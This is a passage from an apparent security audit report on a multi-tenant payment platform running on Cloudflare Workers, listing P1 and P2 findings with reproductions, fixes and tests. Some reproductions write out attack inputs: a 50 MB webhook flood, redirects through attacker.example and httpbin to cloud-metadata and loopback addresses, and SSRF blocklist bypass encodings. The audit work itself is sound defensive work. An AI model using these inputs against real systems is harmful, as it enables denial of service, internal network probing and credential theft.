3. Geo fallback (109-115): `else if (c.req.raw.cf?.country)` — when `cf` is missing, the country check is **skipped** (fail-open). The prior audit's claimed `if (!country || !allowed) 403` is not in the file.
4. (Related, listed here for cohesion) the webhook route has **no rate limit** — CPU-burnable by anonymous requests (only native dashboard rules, optional and not shipped).

**Required invariant:** 1 MiB cap enforced before expensive processing (brief's explicit historical behavior); deterministic replay keys (`hash:sha256(body)` per prior claim or provider event ids); geo fail-closed.

**Threat / failure scenario:** an attacker sends repeated 50 MB bodies to `/webhook/stripe`: each request is IP/geo-allowed (or layers skipped), the HMAC is computed over 50 MB (CPU), and only then rejected — a cheap-to-attacker, expensive-to-platform DoS; a redelivered id-less webhook double-notifies the merchant.

**Existing guard:** signature verification (real, raw-body-based); provider-event-id dedup when ids exist; IP allowlist layer (data-driven).

**Why insufficient:** verification happens *after* reading and hashing the oversized body; dedup keys are non-deterministic for a whole class of providers.

**Impact:** DoS (CPU/D1 write amplification), duplicate merchant notifications, unbounded payload retention (privacy cost too).

**Exploitability:** High (anonymous).

**Reproduction:** `curl -X POST /webhook/stripe --data-binary @50MB-file` → observe non-413 handling; send the same id-less valid payload twice → two event rows, two dispatches.

**Recommended fix:** reject early on `Content-Length > 1_048_576` (413) before `text()`; after reading, `if (rawBody.length > MAX) 413`; fallback `event_id = 'hash:' + sha256(rawBody)`; geo: `if (!country || !WEBHOOK_ALLOWED_COUNTRIES.includes(country)) 403` when the allowlist path is inactive; mount a per-IP limiter group for `/webhook/*`.

**Regression test:** oversized body → 413 with zero D1 writes; duplicate id-less signed body → second response `duplicate`, one event row, one dispatch; missing `cf` → 403 (not passthrough).

**Verdict: FAIL**

---

## EDGE-P1-004 — Outbound webhook SSRF filter misses IPv6 private space, IPv4-mapped IPv6, integer IPs, and redirect targets; deliveries carry no idempotency key

**Severity:** P1
**Confidence:** Confirmed (blocklist read; standard-bypass reasoning)
**Category:** SSRF / webhook delivery
**File:** `src/queues/webhook-consumer.ts:119-166` (`isAllowedWebhookUrl`), `:49-59` (fetch follows redirects by default), `:76-79` (retry delay indexed by constant `webhook.attempt`)

**Observed behavior:** the allowlist check runs **once, on the original URL string**:
- blocked: literal `localhost`, `127.0.0.1`, `::1`, `10.*`, `172.16-31.*`, `192.168.*`, `169.254.*`, `0.0.0.0`, `.local/.internal/.localhost`, non-HTTPS;
- **not blocked:** IPv6 unique-local (`https://[fd00::1]/` → hostname `fd00::1`), link-local (`fe80::…`), IPv4-mapped (`::ffff:10.0.0.1`), integer/hex IPv4 (`https://2130706433/` = 127.0.0.1), and **any redirect**: `fetch` follows 3xx by default, so a public URL that 302s to `http://169.254.169.254/` is followed without re-validation.
Also: no DNS-resolution step (DNS rebinding remains possible — inherent limitation), and no per-delivery idempotency key / event id header (receivers cannot dedup redeliveries), and the retry delay is `[60,300,1800][min(attempt-1,2)]` where `webhook.attempt` is baked into the message body (always 1) — so every retry waits 60s, never escalating (prior audit claimed the escalation fix; it is absent).

**Threat / failure scenario:** a merchant (or the leaked-key attacker, who can register webhooks via `POST /api/v1/webhooks` with **no write-scope requirement** — see EDGE-P1-008) registers `https://attacker.example/redir` which 302s to `http://169.254.169.254/latest/meta-data/` or an internal `http://10.x` service; the queue consumer follows the redirect and POSTs the signed payment payload (containing amounts, customer email/phone) to the internal target; the response body is discarded but the **status/timing** and the mere fact of the POST constitute an SSRF primitive (and if any internal service performs state changes on POST, real impact).

**Existing guard:** string-based blocklist (good for the common cases), HTTPS-only, 15s timeout.

**Why insufficient:** blocklists of IPv4 string prefixes cannot cover the IPv6/redirect/integer encodings; validation-before-resolution is not validation-after-redirect.

**Impact:** internal network probing from the Worker; exfiltration-adjacent POSTs; Cloudflare-internal link-local targets.

**Exploitability:** Medium (requires merchant webhook registration or key compromise — both plausible; the leaked key in EDGE-P0-001 trivially satisfies it).

**Reproduction:** register webhook URL `https://httpbin.org/redirect-to?url=http://127.0.0.1:8080/x&status_code=302` → trigger payment.completed → consumer follows to the loopback target (observe via httpbin/redir logs or a local listener in dev).

**Recommended fix:** `redirect: 'manual'` in the fetch + re-validate each `Location` hop (same allowlist) with a hop cap of 3; canonicalize the hostname (`new URL().hostname` lowercased, strip brackets) and resolve IPv6 forms — reject `fd00::/7`, `fe80::/10`, `::ffff:0:0/96` (map to IPv4 and re-check), `2001:db8::/32` doc range, integer/hex IPv4 via `Number.parseInt` canonicalization; add `X-EdgePay-Delivery-Id` + `Idempotency-Key` headers (stable per event, e.g. `edgepay-{webhook_id}-{event_uuid}`) and index retry delay off `msg.attempts` (Cloudflare-provided) instead of the body field.

**Regression test:** unit table for `isAllowedWebhookUrl` covering every vector above; integration: redirect-to-private is not followed (consumer logs `blocked_ssrf` and acks); duplicate delivery carries identical `Idempotency-Key`.

**Verdict: FAIL**

---

## EDGE-P1-005 — Any merchant admin key can list all merchants and provision new tenants (harvesting their root keys)

**Severity:** P1
**Confidence:** Confirmed (handlers read; no is_platform gate)
**Category:** Authorization / privilege escalation / cross-tenant disclosure
**File:** `src/controllers/admin-api.ts:247-253` (`GET /merchants` — all tenants, no filter), `:256-403` (`POST /merchants` — provisions merchant + admin user + chart + gateways + **root API key + webhook secret + pairing OTP returned in the response**)

**Observed behavior:** both routes require only `requireScope('admin')` — i.e. any *merchant-scoped* admin API key. There is no `is_platform` / role check: the routes are documented "Platform Admin" but nothing enforces it. `GET` returns every merchant's `uuid, name, slug, email, timezone, status, is_platform`. `POST` creates a tenant and returns its `api_key` (scopes `['read','write','admin','*']`), `webhook_secret`, and `pairing_otp` — a full credential harvest primitive. Additionally `POST /reconcile` (226-229) lets any merchant admin trigger **global** reconciliation.

**Threat / failure scenario:** a hostile merchant (or the leaked key) enumerates all tenants' names/emails (competitive + PII disclosure), then provisions tenants at will — each new tenant's root key and webhook secret land in the attacker's response. Provisioned tenants appear in every merchant's catalogs, consume quota, and their pairing OTPs give SMS-injection authority over the new (empty) tenant — and, via the platform merchant fallback in webhook routing (EDGE-P2-004), confusion surface grows.

**Existing guard:** bearer auth + admin scope + per-key rate limit. Nothing tenant-scopes or platform-gates these routes.

**Why insufficient:** "admin" scope means tenant-admin, not platform-admin — the conflation is the vulnerability.

**Impact:** cross-tenant information disclosure; unauthorized tenant creation; credential harvesting; resource abuse.

**Exploitability:** High (any write-capable admin key).

**Reproduction:** merchant key with scopes `['admin']` → `GET /api/admin/v1/merchants` → 200 with all merchants; `POST /api/admin/v1/merchants {"name":"x","email":"x@x.com"}` → 201 with `api_key`+`webhook_secret`+`pairing_otp`.

**Recommended fix:** add a platform-admin gate (separate scope `'platform'`, or `is_platform=1` on the *caller's* merchant, checked in middleware); scope `GET /merchants` to the caller unless platform; never return the new tenant's key via API — force the wizard flow; tenant-scope `POST /reconcile` (or platform-gate it).

**Regression test:** merchant-admin key on both routes → 403; platform key → 200; response of tenant creation contains no `api_key`/`webhook_secret`/`pairing_otp`.

**Verdict: FAIL**

---

## EDGE-P1-006 — Unguarded status writes: completed payments can regress to failed/processing; reconciliation never heals payment rows

**Severity:** P1
**Confidence:** Confirmed (SQL predicates read)
**Category:** State machine / stability
**Files:** `src/services/payment.ts:317-321` (failed without status guard), `:253-262` (processing without status guard), `src/cron/handler.ts:112-130` (expiry races completion), `src/services/reconciliation.ts` (no payment-row healing anywhere)

**Observed behavior:** every status UPDATE is `WHERE id = ?` (or `payment_intent_id = ?`) with **no `AND status IN (…)` precondition**:
- a late, failing redirect callback flips a **completed** transaction to `failed` (ledger stays posted — books vs state diverge);
- re-initiating a completed intent flips it to `processing`;
- the 5-minute expiry cron marks `processing` intents expired while a concurrent completion flips them completed (final state depends on write order);
- conversely, when completion's ledger posting succeeded but the worker died before step 2, the payment row stays `processing`/`awaiting_verification` **forever** — `reconcilePendingPostings` heals the ledger but nothing heals `op_payment_intents.status`; the customer polls `/checkout/{token}/status` indefinitely; the merchant webhook never fires (the queue send also died).

**Required invariant:** terminal states are terminal; every intermediate crash converges (the briefs' question 20).

**Threat / failure scenario:** a paying customer's transaction shows "failed" after a duplicate failing callback → support burden, disputes, refunds of actually-received money; a stuck `awaiting_verification` payment after a transient crash is never completed even though money moved and the ledger posted.

**Existing guard:** the ledger's idempotency (money correctness); the completed early-return in the checkout verify handler (checkout.ts:137-146) only guards *that* handler.

**Why insufficient:** money is protected; status is not.

**Impact:** incorrect payment states persist indefinitely (P1 per the severity model: "incorrect payment state").

**Exploitability:** Medium (needs a late/duplicate callback — routine with gateway retries).

**Reproduction:** complete a payment; replay the callback URL with garbage params that make `adapter.verify` fail → transaction row reads `failed` while `op_ledger_postings` reads `posted`.

**Recommended fix:** add status guards to every terminal-adjacent write (`AND status IN ('pending','processing','awaiting_verification')` for failed; `AND status NOT IN ('completed','failed','expired')` for processing); in the reconciliation sweep, add a step: for every `op_ledger_postings WHERE status='posted' AND reference_type='payment'`, ensure the referenced intent is `completed` (heal + dispatch the missed webhook via the dispatcher, which is idempotent consumer-side with the delivery id from EDGE-P1-004).

**Regression test:** late failing callback after completion → row stays `completed`; killed-worker simulation (fault injection at completeTransaction step 2) + sweep run → intent becomes `completed`, webhook dispatched exactly once.

**Verdict: FAIL**

---

## EDGE-P1-007 — `createIntent` is not atomic and auto-seeds a manual gateway under a race

**Severity:** P1
**Confidence:** Confirmed (sequential `run()`s; no UNIQUE on (merchant_id, slug))
**Category:** Data integrity / concurrency
**Files:** `src/services/payment.ts:108-155` (intent INSERT then transaction INSERT, separate awaits), `:87-104` (first-gateway auto-seed), `migrations/0001:142-157` (`op_gateways` — index only, no UNIQUE)

**Observed behavior:** the prior audit's P0-2 claimed `DB.batch([intentInsert, txnInsert])` — the current code performs **two sequential `.run()`s**; a crash between them persists an intent with no transaction (the "orphan intent" the prior finding described). The no-gateway fallback INSERTs a 'manual' gateway row; two concurrent first-payments for a merchant insert **two** 'manual' rows (no UNIQUE(merchant_id,slug)); the `seeded` re-select then returns an arbitrary one. `trxId = 'op_' + randomToken(12)` is unique, so the tx insert itself is collision-safe.

**Threat / failure scenario:** partial state confuses downstream joins (`handleCallback`, SMS `loadOpenOrders` use `JOIN op_transactions t ON t.payment_intent_id = pi.id` — an orphaned intent yields no callback match → payment stuck); duplicate gateway rows break the "one gateway per slug per merchant" assumption used by webhook merchant resolution (EDGE-P2-004) and refund credential loading.

**Existing guard:** `trx_id UNIQUE` (schema); uuid/token UNIQUE; the post-insert `SELECT id … WHERE uuid = ?` fallback (127-133).

**Why insufficient:** atomicity is a batch, not a fallback select.

**Impact:** orphaned intents, duplicate gateway rows, stuck payments (availability + data hygiene).

**Exploitability:** Low-Medium (requires a crash window or a first-payment race — the latter is a normal launch condition for a new merchant).

**Reproduction:** concurrency test firing 2 createIntent calls for a gateway-less merchant → 2 'manual' gateway rows.

**Recommended fix:** wrap intent+transaction inserts in `env.DB.batch([...])` (use the uuid-keyed SELECT for the intent id, as the prior audit already specified); add migration `CREATE UNIQUE INDEX IF NOT EXISTS uq_gateways_merchant_slug ON op_gateways(merchant_id, slug)` + `INSERT OR IGNORE` semantics in the seeder; replace the auto-seed with a deterministic `SELECT … ORDER BY id ASC LIMIT 1` and a typed 422 `GATEWAY_NOT_CONFIGURED` when none exists (as the prior audit's P1-1 specified — currently re-implemented differently and racily).

**Regression test:** fault-injection between the two writes → 0 intents persisted (batch atomicity); 20-parallel first payments → exactly one gateway row.

**Verdict: FAIL** (regression of a prior-audit P0 claim)

---

## EDGE-P1-008 — Scope enforcement gaps: read-only keys can create payments and mutate webhook configuration

**Severity:** P1
**Confidence:** Confirmed (route middleware reads)
**Category:** Authorization
**Files:** `src/controllers/api.ts:24` (`use('*', requireBearerApiAuth(['read','write','admin']))`), `:34-70` (POST /payments — **no** `requireScope('write')`), `:346-381` (POST/DELETE /webhooks — no write scope), `:386-394` (POST /webhooks/tests — no write scope; also registers the provided URL when none exists — SSRF-adjacent)

**Observed behavior:** `requireBearerApiAuth(['read','write','admin'])` passes if the key holds **any** of the three scopes; therefore a key provisioned with only `read` can: create payment intents (money-adjacent write), register arbitrary webhook URLs, send test webhooks (which, when no endpoint exists, **insert** the supplied URL as the merchant's endpoint), and delete webhooks. Only `/api-keys` (admin), `/refunds` (write) and the admin-API routes carry explicit `requireScope`.

**Required invariant:** every mutating route demands `write` (or a stricter) scope; scope checks happen before mutation (they do, where present).

**Threat / failure scenario:** a leak-scoped read-only integration key (the kind merchants hand to analytics tools) is used to spam payment creation (quota abuse + checkout pages minted under the merchant's name) and to repoint webhook delivery (combined with EDGE-P1-004's SSRF gaps, an internal-probe primitive).

**Existing guard:** authentication is solid; the *default scope list* conflates read and write.

**Why insufficient:** "any-of" semantics for a write-capable default is an authorization design error.

**Impact:** unauthorized mutations with read-only credentials.

**Exploitability:** High (keys with `['read']` are common and shared).

**Reproduction:** mint key with scopes `['read']` → `POST /api/v1/payments` → 201.

**Recommended fix:** change the route-level default to `requireBearerApiAuth(['read'])` for GET-only stacks and add `requireScope('write')` on every POST/PUT/DELETE (payments, webhooks, webhook tests, webhook delete); keep `requireScope('admin')` for key management. Mirror the matrix in a test that enumerates routes × methods × scopes.

**Regression test:** read-key POST /payments → 403; read-key POST /webhooks → 403; write-key OK.

**Verdict: FAIL**

---

## EDGE-P1-009 — Security regression tests are broken: tenant-routing JWT suite crashes, lint cannot run

**Severity:** P1 (process/CI)
**Confidence:** Confirmed (execution output)
**Category:** Testing quality / CI
**Files:** `vitest.config.ts` (miniflare bindings define only `ALLOWED_ORIGINS` — no `JWT_SECRET`), `tests/tenant-routing.test.ts:64` (`createJwtService(env as unknown as Env)` → `secret.length` on undefined), missing `eslint.config.js` (package.json lint script)

**Observed behavior:** the JWT tenant-mismatch security test crashes in `beforeAll`, so **none of its assertions run**; `npm run lint` exits before linting (ESLint 9 flat-config missing). CI therefore reports "green" only because the crash is confined to one suite file and lint was presumably never wired into CI. The `ALLOWED_ORIGINS` value that IS injected (`https://allowed.example`) is simultaneously the magic value that **disables the DO fault-injection guard** (ledger-do.ts:383) — an env coupling that quietly couples test config to a production guard.

**Threat / failure scenario:** future regressions in tenant mismatch (JWT side) or style/security lint rules go undetected; the "161/161" historical claim cannot be reproduced (207/212 today with a broken suite).

**Existing guard:** none (this IS the guard layer failing).

**Impact:** false confidence in the security posture.

**Exploitability:** n/a.

**Reproduction:** `npm test` → the FAIL block quoted in §2.1; `npm run lint` → the ESLint 9 config error.

**Recommended fix:** add `JWT_SECRET: '<64-hex test secret>'` (and any other secrets the suites construct services with) to the vitest miniflare bindings, or read them from `.dev.vars` in the test setup; add an `eslint.config.js` (typescript-eslint flat config) and wire `typecheck + lint + test` into CI as separate required jobs; decouple the fault-injection guard from `ALLOWED_ORIGINS` (use an explicit `TEST_MODE` secret instead).

**Regression test:** CI asserts `npm test` exits 0 with 0 failed suites and `npm run lint` exits 0.

**Verdict: FAIL**

---

## EDGE-P1-010 — KV-based per-IP rate limiting is racy and misconfigured for install (120/min vs documented 3/hour); anonymous auth surfaces unthrottled

**Severity:** P1
**Confidence:** Confirmed (middleware read + config table)
**Category:** Rate limiting / abuse resistance
**Files:** `src/middleware/rate-limit.ts:33-40` (`'install': {windowSec: 60, maxRequests: 120}` — while `index.ts:181-184`'s comment claims "3/hour"), `:106-150` (read-modify-write KV counter), `src/controllers/mobile.ts` (no limiter on pair/refresh), `src/controllers/webhooks.ts` (no limiter)

**Observed behavior:** the KV limiter reads a counter, increments in memory, and writes back via `waitUntil` — under concurrency all requests read the same value and the counter under-counts (the limit may never trip for parallel bursts). The install group allows **120 requests per minute** — 2,400× looser than the documented 3/hour that the prior audit's P1-7 narrative claims. The `otp` and `password` groups (10/hour) exist in the table but are **never mounted** — mobile pairing, the OTP brute-force surface of EDGE-P1-002, has zero limiting. The native per-key limiter (correctly mounted on api/admin after auth) fails open when the binding is absent (`rate-limit.ts:75-80`, metric only).

**Threat / failure scenario:** `/install/bootstrap-key` password guessing at ~7,200 attempts/hour/IP (bounded only by that 120/min cap); pairing OTP brute-force unthrottled (EDGE-P1-002); parallel bursts bypass the KV counter entirely.

**Existing guard:** native Ratelimit binding for authenticated routes (solid when present); CF-Connecting-IP trust (correct on-platform).

**Why insufficient:** anonymous auth-critical surfaces are either unlimited or limited in name only.

**Impact:** credential brute-force feasibility (chains into P0-005); quota abuse.

**Exploitability:** High.

**Reproduction:** fire 200 parallel POSTs to `/install` from one IP → none 429 (counter race + high cap); fire 500 sequential pair attempts → zero 429s.

**Recommended fix:** set install to `{windowSec:3600, maxRequests:3}`; mount `otp` on `/api/mobile/v1/pair|refresh` and a new `webhook` group on `/webhook/*`; replace the RMW counter with KV's atomic-ish pattern (put with `expirationTtl` from a deterministic bucket key `rl:{group}:{ip}:{floor(now/window)}` — no read needed, count = presence checks are approximate but monotonic) or keep the native binding and accept approximate limits; document the fail-open choice per endpoint class (fail-open acceptable for reads, fail-closed for auth/write).

**Regression test:** 4th install POST within the hour → 429; 11th pair attempt → 429; parallel burst of 100 install POSTs → ≥1 429 (probabilistic; assert at least the cap is respected within a tolerance).

**Verdict: FAIL**


---

# 12. Findings — P2 Medium

Condensed format (same fields, tighter prose) for P2; each still carries scenario, guard assessment, fix, and test.

---

## EDGE-P2-001 — CSRF middleware is dead code (never mounted)

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/middleware/csrf.ts` (complete, correct double-submit implementation), `src/index.ts` (no import/use — only `AppVariables.csrfToken` remains).
**Scenario:** all browser-reachable state-changing endpoints (checkout initiate/verify, mobile pairing) rely solely on unguessable tokens; if any future route adds cookie auth, CSRF protection silently does not exist. The middleware's exemption list (`/api`, `/webhook`, `/install`) matches the bearer-auth design — but the file is 90 lines of untested, unmaintained code that implies protection exists.
**Guard assessment:** bearer/JWT auth makes CSRF largely moot **today**; the risk is the false impression of coverage.
**Fix:** either mount it on HTML-surface POST routes (checkout) or delete the file and the `csrfToken` variable, and document "no cookie auth ⇒ no CSRF surface" in docs/SECURITY.md.
**Test:** if mounted: cross-site POST without token → 403. **Verdict: CONDITIONAL.**

## EDGE-P2-002 — DO fault-injection seam guarded by a magic env combination

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/do/ledger-do.ts:378-387`.
**Scenario:** `__testInjectFault` throws only when `ENVIRONMENT==='production' && ALLOWED_ORIGINS !== 'https://allowed.example'`; a production deployment that sets `ALLOWED_ORIGINS` to the value vitest.config.ts documents as *the test value* has fault injection live. The seam is RPC-reachable only from worker code (no HTTP surface), so exploitation requires worker-level compromise — but the guard is an allowlist inverted (it should fail closed on `ENVIRONMENT !== 'production'` alone, or require an explicit `TEST_MODE` secret).
**Fix:** `if (this.env.ENVIRONMENT === 'production') throw` unconditionally; add `ALLOWED_ORIGINS` decoupling from test config.
**Test:** production-mode env + seam call → throws. **Verdict: CONDITIONAL.**

## EDGE-P2-003 — Platform merchant excluded from consistency verification

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/services/reconciliation.ts:168` (`WHERE status='active' AND is_platform = 0`).
**Scenario:** bootstrap's platform merchant is the default webhook-routing fallback (EDGE-P2-004) and can hold real payments; its DO/D1 divergence is never detected or paged.
**Fix:** verify all active merchants (drop the predicate) or explicitly document why the platform tenant is exempt (there is no valid reason).
**Test:** platform-merchant drift is injected → sweep pages. **Verdict: FAIL.**

## EDGE-P2-004 — Webhook merchant resolution on the master domain binds to the platform merchant

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/controllers/webhooks.ts:70-84` (`ORDER BY m.is_platform DESC, g.id ASC LIMIT 1`).
**Scenario:** merchant B configures 'stripe'; the platform merchant also has 'stripe'; B's provider posts to the master-domain webhook URL (or a missed custom-domain DNS) → context resolves to the platform merchant → credentials verified are the **platform's** → tx lookup with `merchant_id=platform` misses B's transaction → handler returns **200 'processed'** without completing anything. Payment stays pending until an operator notices; the 200 misleads the provider into thinking delivery succeeded.
**Fix:** when no domain merchant is resolved, look up candidate transactions by `trx_id` first (across merchants via the id extracted from the payload), then bind merchant; or reject with 400 when ambiguous; at minimum return 202 + a `matched:false` signal and a metric.
**Test:** two-merchant same-slug webhook on master domain → no silent 200. **Verdict: FAIL (availability).**

## EDGE-P2-005 — Ratelimit binding absence fails open on write endpoints

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/middleware/rate-limit.ts:75-80`.
**Scenario:** misconfigured deploy (binding omitted) silently disables per-key limits on payment/refund writes; only a metric (itself a no-op when ANALYTICS is unbound — EDGE-P2-006) records it.
**Fix:** fail closed (503) for non-GET on missing binding, or at minimum `page('RATE_LIMIT_DEGRADED')` instead of `metric`.
**Test:** unbound env + POST /payments → 503 (or page fired). **Verdict: CONDITIONAL.**

## EDGE-P2-006 — Analytics Engine binding commented out: all metrics are silent no-ops

**Severity/Confidence:** P2 / Confirmed. **Files:** `wrangler.jsonc:233-235` (commented `analytics_engine_datasets`), `src/lib/observability.ts` (`env.ANALYTICS?.writeDataPoint` — optional-chained everywhere).
**Scenario:** every "metric" cited in comments (rate_limit_degraded, sms_parse_miss, webhook_lag, ledger_posting_healed, reconciliation_run) vanishes in default deployments; the `page()` console channel still works, but the operational metrics story is fiction until the operator reads the source to discover they must uncomment a config block.
**Fix:** ship the binding enabled (it is free-tier-capable) and document the dashboard/alert wiring; or emit a one-time startup page() when ANALYTICS is unbound.
**Test:** integration asserts writeDataPoint called for a rate-limit event. **Verdict: CONDITIONAL.**

## EDGE-P2-007 — No outbox: crash between D1 commit and queue send loses the merchant webhook

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/services/payment.ts:389-415` (batch commit then `await dispatcher.dispatch`), `src/services/webhook-dispatcher.ts:64-67` (`sendBatch`).
**Scenario:** worker eviction between step 2 and step 3 of completeTransaction → payment completed + ledger posted, merchant never notified (consumer never runs); EDGE-P1-006's proposed sweep-heal is the compensating control (webhook re-dispatch keyed by ledger posted-state).
**Fix:** transactional-outbox pattern (an `op_webhook_outbox` row written in the same D1 batch as completion; a cron/consumer drains it), or the sweep-heal dispatch from P1-006; make `dispatch` idempotent per (event, intent) with the delivery id from P1-004.
**Test:** fault-inject after step 2 → sweep re-dispatches exactly one webhook. **Verdict: CONDITIONAL.**

## EDGE-P2-008 — D1 mirror dedup guard drops legitimate identical journal lines

**Severity/Confidence:** P2 / Confirmed (latent). **Files:** `src/services/ledger-audit.ts:101-129` (NOT EXISTS on `(ledger_transaction_id, account_id, direction, amount)`).
**Scenario:** any future posting containing two identical lines (e.g. two same-amount fees to the same account) persists both in the DO journal but only the first in the D1 mirror → `verifyDurableObjectConsistency` reports permanent drift → nightly pages (alarm fatigue) while money is actually correct. Current entry constructors avoid duplicates; the guard encodes a false invariant.
**Fix:** dedup on a line-ordinal column (`entry_index`) instead of the 4-tuple, or relax the mirror check to compare **sums per (account, direction)**.
**Test:** posting with duplicate lines → mirror matches DO. **Verdict: CONDITIONAL.**

## EDGE-P2-009 — Wrong/rotated ENCRYPTION_KEY degrades silently

**Severity/Confidence:** P2 / Confirmed. **Files:** all `decrypt` call sites (`catch { /* skip */ }` — payment.ts:210-215, webhooks.ts:124-127, api.ts:213-216, refund.ts:151-156, refund-reconciliation.ts:267-273).
**Scenario:** a rotated key makes every stored gateway credential undecryptable; adapters receive empty credential maps and fail with "missing credentials" — operators chase phantom gateway outages instead of key mismatch.
**Fix:** count and `page('DECRYPT_FAILURE')` on first failure per gateway config; add an env probe (encrypt+decrypt round-trip at startup).
**Test:** wrong key → page emitted; adapters fail with `KEY_MISMATCH` not `missing credentials`. **Verdict: CONDITIONAL.**

## EDGE-P2-010 — Single versionless ENCRYPTION_KEY; no rotation path; platform-wide blast radius

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/lib/crypto.ts:41-95` (envelope has no key id), `wrangler.jsonc` (one secret).
**Scenario:** key compromise (or the mandatory rotation after EDGE-P0-001) cannot be done without a big-bang re-encryption of every `op_gateway_configs.field_value` and PII blob; a single key decrypts **all merchants'** credentials (no per-tenant derivation).
**Fix:** version the envelope (`v1‖iv‖ct`), add `ENCRYPTION_KEY_V2` + lazy re-encrypt-on-read, document rotation; optionally derive per-merchant keys via HKDF( master, merchant_id ).
**Test:** rotate → old ciphertexts still decrypt via v1, new writes use v2, re-encrypted rows flip versions. **Verdict: FAIL (operability of a security-critical secret).**

## EDGE-P2-011 — Break-glass comparison is not timing-safe; JWKS fetch has no timeout

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/middleware/cloudflare-access.ts:338-342` (`===` on both id and secret), `:254` (fetch without AbortController).
**Scenario:** byte-at-a-time timing oracle on the break-glass secret (mitigated by network jitter on Workers, but the fix is one line); a stalled JWKS endpoint hangs every admin request until the client gives up (no deadline).
**Fix:** `timingSafeEqual(bgId, env.BREAK_GLASS_CLIENT_ID) && timingSafeEqual(bgSecret, …)`; wrap the JWKS fetch in a 5s AbortController and treat AbortError as the 503 path.
**Test:** unit test comparing with the timing-safe helper; JWKS mock that never resolves → 503 within 5s. **Verdict: CONDITIONAL.**

## EDGE-P2-012 — LedgerDO does not verify payload.merchant_id matches its own identity

**Severity/Confidence:** P2 / Confirmed (defense-in-depth gap). **Files:** `src/do/ledger-do.ts` (no self-identity check), `src/services/ledger.ts:74-77` (name is the only binding).
**Scenario:** a future caller bug (or compromised worker code) posting merchant X's payload into `idFromName('merchant-Y')` corrupts Y's book while D1's postings row says X — the exact cross-tenant ledger modification the briefs call catastrophic. Today every call site passes matching ids (verified), so this is hardening, not an active bug.
**Fix:** in `postTransaction`, derive the DO name (`this.ctx.id.name`) and reject `payload.merchant_id !== Number(name.slice(9))` with a `TENANT_MISMATCH` structured failure.
**Test:** mismatched payload → structured failure, no writes. **Verdict: CONDITIONAL.**

## EDGE-P2-013 — `op_api_keys.key_prefix` lacks a UNIQUE constraint

**Severity/Confidence:** P2 / Confirmed. **Files:** `migrations/0001:108-123`, `src/middleware/auth.ts:53-60`.
**Scenario:** prefix collision (birthday bound ~36^6 ≈ 2×10^9 keys for 50% — practically unreachable, but the *lookup* `LIMIT 1` without ORDER BY makes behavior nondeterministic and one key silently stops working).
**Fix:** `CREATE UNIQUE INDEX uq_api_keys_prefix ON op_api_keys(key_prefix)` + retry-on-collision in the key minters.
**Test:** insert duplicate prefix → constraint error. **Verdict: CONDITIONAL.**

## EDGE-P2-014 — Unbounded/unchecked inputs on public surfaces (body sizes, arrays, offsets)

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/controllers/checkout.ts:79,102` (`c.req.json` unbounded), `src/controllers/mobile.ts:192-230` (batch SMS: unbounded `messages` array → unbounded queue sends per request), `src/controllers/api.ts:100-101` (`offset` parsed, negative accepted → SQLite error/500).
**Scenario:** a paired device posts 10,000 SMS messages in one request → 10,000 queue sends in one invocation (subrequest limits, cost amplification); oversized checkout JSON burns CPU; negative offset yields a 500.
**Fix:** cap JSON bodies (Content-Length + read cap) on public routes; cap batch to ≤100 messages; `Math.max(0, …)` and NaN-guards on pagination.
**Test:** 101-message batch → 413/400; negative offset → empty 200. **Verdict: CONDITIONAL.**

## EDGE-P2-015 — SMS regex templates are merchant-editable and compiled with `new RegExp` (ReDoS)

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/services/sms-parser.ts:180-202` (`new RegExp(tpl.regex_pattern, 'i')` on `op_sms_templates.regex_pattern`), `src/controllers/admin-api.ts:84-104` (PUT /sms-templates writes arbitrary patterns).
**Scenario:** a merchant (or key thief) stores a catastrophic-backtracking pattern; every SMS parse burns CPU; the queue consumer's per-message timeout (60s default consumer limit) trips → retries → retry storm on the same poison message (bounded by max_retries=3 → DLQ, but each attempt costs CPU across the batch).
**Fix:** validate patterns on write (lint for nested quantifiers or run with a safe-regex checker); execute with a length cap on input (already 5 MB mockup cap — cap SMS body at e.g. 2,000 chars on ingestion) and wrap `regex.exec` in a worker-side time budget.
**Test:** evil pattern + 100KB SMS → bounded processing (no 30s CPU). **Verdict: CONDITIONAL.**

## EDGE-P2-016 — `ENABLED_GATEWAYS` unset ⇒ every adapter enabled (fail-open default)

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/gateways/enabled.ts:93-95`, `wrangler.jsonc:43-45` (comment documents unset = all).
**Scenario:** a deploy-button user who skips the variable gets 123 adapters' attack surface and configuration prompts for gateways they never chose; disabled-gateway 404 indistinguishability (a good property) never engages.
**Fix:** require an explicit `all` to opt into everything (breaking but safer), or at minimum emit a startup page() when unset.
**Test:** unset → warning/page; 'all' → all; 'typo' → zero. **Verdict: CONDITIONAL.**

## EDGE-P2-017 — PBKDF2 default 50K vs documented 600K; env can lower to 10K

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/lib/crypto.ts:28-30`, header comment `:11-13`.
**Scenario:** the only password-hashed accounts (install admin, bootstrap admin) are 12× cheaper to brute-force than the documentation claims; free-tier guidance encourages 10K. Offline attack requires the D1 export.
**Fix:** default 600K (Workers Paid CPU can absorb it; it is per-login, not per-request), floor at 100K, and correct the comment.
**Test:** hashPassword() embeds ≥100K; verify rejects <10K. **Verdict: FAIL (as documented vs implemented).**

## EDGE-P2-018 — No payment-amount ceiling at the API boundary

**Severity/Confidence:** P2 / Confirmed. **Files:** `src/lib/validation.ts:20-22` (`^\d+(\.\d{1,2})?$` — unbounded), `src/do/ledger-do.ts:53` (MAX 90M minor units enforced only at posting).
**Scenario:** a 10^20-amount intent validates, renders a checkout page, and only fails at completion (`moneyToMinorStrict` RangeError → 500 at the money moment — the worst possible failure point). Ledger never corrupts (fail closed) but the customer journey dead-ends.
**Fix:** `moneySchema.max` semantic: reject `cmp(amount, MAX)>0` in zod (e.g. 99,999,999.99) and per-merchant configurable caps.
**Test:** 10^12 amount → 400 at creation. **Verdict: CONDITIONAL.**

## EDGE-P2-019 — Currency-specific minor-unit exponents are ignored (exponent hardcoded 2)

